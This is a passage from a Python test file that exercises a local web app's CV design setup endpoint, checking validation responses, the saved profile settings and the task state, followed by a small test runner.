        except urllib.error.HTTPError as e:
            assert e.code == 404
        assert post({"choice": "nonsense", "photo": "keep"}) == 400
        assert post({"choice": "improve", "photo": "sometimes"}) == 400
        assert post({"choice": "improve", "photo": "auto"}) == 200
        d = json.load(open(os.path.join(home, "profile", "cv_design.json"), encoding="utf-8"))
        assert d == {"design": "own", "improved": True, "photo": "auto", "pages": 2, "chosen": "improve"}
        assert post({"choice": "switch", "photo": "keep"}) == 200
        d = json.load(open(os.path.join(home, "profile", "cv_design.json"), encoding="utf-8"))
        assert d["design"] == "jobdesk" and d["pages"] == 1 and d["photo"] == "keep"
        assert json.load(urllib.request.urlopen(base + "/api/setup/state"))["tasks"]["design"]["state"] == "queued"
    finally:
        srv.terminate()


if __name__ == "__main__":
    failed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn(); print("ok  ", name)
            except Exception as e:  # noqa: BLE001
                failed += 1; print("FAIL", name, "-", e)
    sys.exit(1 if failed else 0)
